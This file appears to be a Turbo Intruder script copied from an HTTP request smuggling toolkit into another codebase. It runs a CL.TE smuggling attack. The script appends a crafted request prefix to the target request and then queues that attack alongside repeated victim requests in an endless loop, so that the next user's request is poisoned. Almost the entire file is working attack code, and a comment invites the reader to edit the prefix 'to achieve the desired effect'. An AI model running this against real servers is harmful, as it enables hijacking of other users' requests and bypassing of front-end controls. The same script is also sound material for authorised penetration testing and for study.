# Extracted from: C:\DEV\PyAgent\.external\cache\work\copilot_tmp\chunk_0_CL_TE.py
# Extracted from: C:\DEV\PyAgent\.external\0xSojalSec-http-request-smuggler\resources\CL-TE.py
# NOTE: extracted with static-only rules; review before use


def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=5,
        requestsPerConnection=1,
        resumeSSL=False,
        timeout=10,
        pipeline=False,
        engine=Engine.THREADED,
        maxRetriesPerRequest=0,
    )

    # This will prefix the victim's request. Edit it to achieve the desired effect.

    prefix = """GET /robots.txt HTTP/1.1

X-Ignore: X"""

    # HTTP uses \r\n for line-endings. Linux uses \n so we need to normalise

    if "\r" not in prefix:
        prefix = prefix.replace("\n", "\r\n")

    # The request engine will auto-fix the content-length for us

    attack = target.req + prefix

    victim = target.req

    while True:
        engine.queue(attack)

        for i in range(4):
            engine.queue(victim)

            time.sleep(0.05)

        time.sleep(1)


def handleResponse(req, interesting):
    table.add(req)
